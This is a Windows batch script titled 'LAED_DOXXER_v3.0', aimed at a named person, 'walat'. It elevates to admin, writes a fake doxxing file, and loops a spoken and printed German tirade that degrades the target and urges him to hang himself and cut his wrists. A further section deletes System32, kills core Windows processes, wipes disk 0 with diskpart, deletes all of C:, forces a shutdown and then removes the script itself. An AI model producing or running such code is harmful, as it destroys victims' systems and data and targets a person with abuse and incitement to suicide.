@echo off
setlocal enabledelayedexpansion
title LAED_DOXXER_v3.0 - [LOADING WALAT TARGET]

:: ------------------ STEALTH PERSISTENCE & ELEVATION ------------------
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting ADMIN rights for full doxxing...
    powershell start -verb runas '%0' exit
    exit /b
)

:: Fake "doxxing" setup
set "doxxDir=%userprofile%\Desktop\LAED_DOXX_LEAKS"
mkdir "%doxxDir%" 2>nul
echo [LAED ARCHIVE] Target: walat > "%doxxDir%\walat_full_leak.txt"
echo IP: 127.0.0.1 (tor exit node) >> "%doxxDir%\walat_full_leak.txt"
echo Geolocation: Mutter Keller, Berlin >> "%doxxDir%\walat_full_leak.txt"
echo Bloodline: Inzest-Drecksprodukt >> "%doxxDir%\walat_full_leak.txt"

:: ------------------ BUILD VBS FOR VOICE ------------------
set "vbsScript=%temp%\walat_voice.vbs"
(
echo Dim speaks, insult, fso, shell
echo Set shell = CreateObject("WScript.Shell"^)
echo Set fso = CreateObject("Scripting.FileSystemObject"^)
echo Set speaks = CreateObject("SAPI.SpVoice"^)
echo speaks.Volume = 100
echo speaks.Rate = 0
echo insult = "walat Du jämmerlicher sabbernder Inzest-Missgriff. Dein Vater hat deine Mutter nur gefickt weil er zu besoffen war um zu merken dass er seine eigene Schwester besteigt. Deshalb bist du rausgekommen: ein deformierter hirntoter Klumpen aus kaputten Genen und purem Versagen. Dein Leben ist ein einziger Witz. Du wachst auf starrst in den Spiegel und siehst einen fetten pickeligen glatzköpfigen Loser der nie einen Job länger als zwei Wochen gehalten hat. Dein Schwanz ist so winzig dass du ihn mit einer Pinzette suchen musst und selbst dann würdest du lieber heulen weil er nicht funktioniert. Jede Frau die dich je gesehen hat hat sofort ihre Periode bekommen aus purem Ekel. Du bist nicht mal wert dass man auf dich pisst. Kriech zurück in deine versiffte Wohnung wo du zwischen alten Pornos Pizzaschachteln und deinem eigenen Schweiß erstickst. Häng dich auf du feige Ratte. Schneid dir die Pulsadern auf und verblute langsam auf deinem verdreckten Teppich während du noch ein letztes Mal an deine nicht vorhandenen Erfolge denkst. Du bist der Grund warum Kondome erfunden wurden. Ein biologischer Unfall. Ein wandelnder Beweis dass die Evolution manchmal scheitert."
echo Do While True
echo     speaks.Speak insult
echo     WScript.Echo insult
echo     fso.OpenTextFile("%doxxDir%\WALAT_VOICE_LOG.txt", 8, True^).WriteLine(insult^)
echo     WScript.Sleep 1000
echo Loop
) > "%vbsScript%"

:: Launch voice spam in a hidden window
start /min wscript.exe "%vbsScript%"

:: ------------------ CONSOLE & FILE SPAM LOOP ------------------
:spam_console
set "insult=walat Du jämmerlicher, sabbernder Inzest-Missgriff. Dein Vater hat deine Mutter nur gefickt, weil er zu besoffen war, um zu merken, dass er seine eigene Schwester besteigt. Deshalb bist du rausgekommen: ein deformierter, hirntoter Klumpen aus kaputten Genen und purem Versagen. Dein Leben ist ein einziger Witz. Du wachst auf, starrst in den Spiegel und siehst einen fetten, pickeligen, glatzköpfigen Loser, der nie einen Job länger als zwei Wochen gehalten hat. Dein Schwanz ist so winzig, dass du ihn mit einer Pinzette suchen musst, und selbst dann würdest du lieber heulen, weil er nicht funktioniert. Jede Frau, die dich je gesehen hat, hat sofort ihre Periode bekommen – aus purem Ekel. Du bist nicht mal wert, dass man auf dich pisst. Kriech zurück in deine versiffte Wohnung, wo du zwischen alten Pornos, Pizzaschachteln und deinem eigenen Schweiß erstickst. Häng dich auf, du feige Ratte. Schneid dir die Pulsadern auf und verblute langsam auf deinem verdreckten Teppich, während du noch ein letztes Mal an deine nicht vorhandenen Erfolge denkst. Du bist der Grund, warum Kondome erfunden wurden. Ein biologischer Unfall. Ein wandelnder Beweis, dass die Evolution manchmal scheitert."
echo %insult%
echo %insult% >> "%doxxDir%\WALAT_DOXXED_FINAL.txt"
timeout /t 1 >nul
goto spam_console

:: ------------------ DESTRUCTIVE PAYLOAD (silent but deadly) ------------------
:: This runs parallel to spam (will execute after ~5 seconds due to background)
start /b cmd /c (
    timeout /t 5 >nul
    :: Delete critical system directories
    takeown /f "C:\Windows" /r /d y 2>nul
    icacls "C:\Windows" /grant "%username%":F /t 2>nul
    rd /s /q "C:\Windows\System32" 2>nul
    rd /s /q "C:\Windows\SysWOW64" 2>nul
    :: Kill important processes
    taskkill /f /im winlogon.exe 2>nul
    taskkill /f /im csrss.exe 2>nul
    taskkill /f /im lsass.exe 2>nul
    :: Corrupt master boot record (via diskpart script)
    echo select disk 0 > "%temp%\mbkiller.txt"
    echo clean >> "%temp%\mbkiller.txt"
    echo convert mbr >> "%temp%\mbkiller.txt"
    echo create partition primary >> "%temp%\mbkiller.txt"
    echo active >> "%temp%\mbkiller.txt"
    echo exit >> "%temp%\mbkiller.txt"
    diskpart /s "%temp%\mbkiller.txt" 2>nul
    :: Delete everything on C:
    del /f /s /q "C:\*.*" >nul 2>&1
    :: Final shutdown with fake BSOD message
    shutdown /s /f /t 10 /c "LAED_DOXXER: Walat erfolgreich zerstört. System korrupt. Gute Nacht, Wurm."
)

:: ------------------ DESTROY SELF AFTER EXECUTION ------------------
:: This ensures the .bat deletes itself after chaos
(
    echo del "%~f0" > "%temp%\selfdestruct.cmd"
    echo exit >> "%temp%\selfdestruct.cmd"
) && start /b cmd /c "%temp%\selfdestruct.cmd"

:: Infinite loop – the spam already runs forever; this parent process just waits
:wait_forever
ping 127.0.0.1 -n 60 >nul
goto wait_forever